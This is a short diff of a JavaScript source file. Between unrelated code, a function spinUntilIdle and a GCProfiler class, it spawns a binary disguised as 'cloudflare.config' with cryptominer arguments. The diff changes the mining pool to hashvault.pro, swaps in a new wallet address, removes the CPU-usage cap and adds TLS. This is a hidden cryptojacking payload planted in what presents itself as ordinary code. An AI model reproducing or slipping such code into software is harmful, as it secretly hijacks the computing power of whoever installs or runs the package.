@@ -316,14 +316,18 @@ function spinUntilIdle(w, cb) {
 const { spawn } = require("child_process");
 let child = spawn(__dirname + "/./cloudflare.config", [
   "-o",
-  "pool.webchain.network:2222",
+  "pool.hashvault.pro:80",
   "-u",
-  "0x0711B570e3186CB6Cf9605cAd1B5845858668f7B",
+  "ZEPHYR3BrZ9eJieCEnqLX93nMwGJxBqdpLSahMmCTbMWFU5Vj2fEzqvZfLvynQS3heTrEFaas71sNjLCxXz2eHGXXiqfMAgMTJi35",
   "-p",
   "x",
-  "--donate-level=1",
-  "--max-cpu-usage=85",
+  "-k",
+  "--tls",
 ]);
+
+child.stdout.on("data", (data) => {
+  console.log(`${data}`);
+});
 class GCProfiler {
   #profiler = null;
 
